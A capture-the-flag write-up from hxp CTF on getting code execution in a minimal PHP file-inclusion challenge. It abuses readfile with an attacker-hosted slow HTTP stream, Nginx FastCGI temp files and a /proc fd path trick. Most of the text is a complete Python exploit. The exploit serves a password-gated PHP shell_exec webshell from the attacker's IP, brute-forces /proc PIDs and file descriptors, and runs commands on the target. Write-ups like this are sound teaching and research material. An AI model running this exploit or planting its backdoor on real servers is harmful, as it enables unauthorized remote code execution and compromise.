from hxp ctf


We are presented with a minimal PHP (🤎) challenge with the goal of getting code execution:
```
<?php ($_GET['action'] ?? 'read' ) === 'read' ? readfile($_GET['file'] ?? 'index.php') : include_once($_GET['file'] ?? 'index.php');
```
It’s clear that we again have a (hard?) LFI PHP task via include_once($_GET['file'] ?? 'index.php'). Additionally, the challenge seems to contain a suspicious readfile branch in the otherwise aesthetically pleasing minimal appearance. Let’s use this feature to write a file with attacker-chosen content in order to get code execution.

Note: this challenge can also be solved without the readfile feature, as demonstrated here.

readfile is a neat PHP function that: “Reads a file and writes it to the output buffer.” Contrary to include, it also supports reading URL streams like http:// resources and directly writes them to the output buffer.
Attack plan:

    Use readfile to read a big and slow HTTP resource (and keep the connection open)
    Use Nginx’s fastcgi_buffering to create a tempfile
    Include the freshly created tempfile
    Usual racing and stuff
    …
    Profit

Annoyances:

readfile and fastcgi_buffering seems to only create a file when the client is connected via HTTP/1.0 (see curl part in exploit). Otherwise, chunked transfer can be used.

Nginx instantly unlinks the newly created file.

Including the new file via our friend procfs (🤎) e.g /proc/$NGINX_WORKER_PID/fd/$FD only works within a very small time window and requires a lot of luck (or a lot of violent force). If we’re too slow, PHP’s include resolves this path to strings like /var/lib/nginx/fastcgi/4/01/0000000014 (deleted), which doesn’t exist in the filesystem. Luckily the logic in include can be confused via /proc/self/fd/$NGINX_WORKER_PID/../../../$NGINX_WORKER_PID/fd/$FD (thanks @hlt for this trick!), which will make it always interpret the content of the original file. This trick greatly reduces the amount of luck/force needed to make this exploit work reliably and quickly.

Note: This race can also be won without confusing include, see pasten’s includer’s revenge + counter writeup.

Full exploit:

```
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import threading, secrets, time, requests, sys, os, hashlib, signal

password = secrets.token_urlsafe(16)
backdoor_name = secrets.token_urlsafe(8)
backdoor_password = secrets.token_urlsafe(16)
backdoor_password_hash = hashlib.md5(backdoor_password.encode()).hexdigest()

URL = f'http://{sys.argv[1]}:{sys.argv[2]}/'
MY_IP = sys.argv[3]
MY_PORT = int(sys.argv[4])

payload = f'''<?php if(md5($_GET["s"])==="{backdoor_password_hash}")echo shell_exec($_GET["c"]); echo 'DONE-'.'{backdoor_name}';__halt_compiler();'''.encode()

bruter_runnig = False
found = False

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        global bruter_runnig

        self.send_response(200)
        self.end_headers()
        print(f'[*] request: {self.path}', file=sys.stderr)
        if password not in self.path:
            return

        for i in range(15):
            if found:
                exit()

            if i == 0:
                self.wfile.write(payload*(13*1024*1024//len(payload)))

                if not bruter_runnig:
                    bruter_runnig = True
                    for pid in nginx_workers:
                        a = threading.Thread(target=attacker, args = (pid, ), daemon=True)
                        a.start()

            else:
                self.wfile.write(payload)

            time.sleep(1)

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass

def server():
    print('[+] http server started', file=sys.stderr)
    server = ThreadingSimpleServer(('0.0.0.0', MY_PORT), Handler)
    server.serve_forever()

s = threading.Thread(target=server, daemon=True)
s.start()

nginx_workers = []
sess = requests.Session()

r  = sess.get(URL, params={
    'file': f'/proc/cpuinfo'
})

processors = r.text.count('processor')
print(f'[*] processors: {processors}', file=sys.stderr)

for pid in range(250):
    r  = sess.get(URL, params={
        'file': f'/proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= processors:
            break

    time.sleep(0.1)
else:
    print('[+] not all nginx workers found :(, try to increase pid max?', file=sys.stderr)
    exit(1)


def attacker(pid):
    global found
    time.sleep(2)

    while True:

        print(f'[+] starting brute: {pid}', file=sys.stderr)
        for fd in range(4, 64):
            if found:
                exit()

            r  = requests.get(URL, params={
                'file': f'/proc/self/fd/{pid}/../../../{pid}/fd/{fd}',
                'action': 'include',
                's': backdoor_password,
                'c': 'echo "\n"; /readflag; id; ls -l /proc/*/fd/; echo "\n"'
            })
            if r.status_code == 200 and 'DONE-' + backdoor_name in r.text:
                print(f'[*] FOUND {pid} {fd} {r.text}', file=sys.stderr)

                found = True
                exit()


for i in range(15):
    print(f'[+] starting download {i}', file=sys.stderr)
    os.system(f'timeout 15 curl -s -0 --limit-rate 1k "{URL}/?action=read&file=http://{MY_IP}:{MY_PORT}/?{password}" > /dev/null &')

    for _ in range(int(15/0.5)):
        if found:
            exit()
        time.sleep(0.5)
```
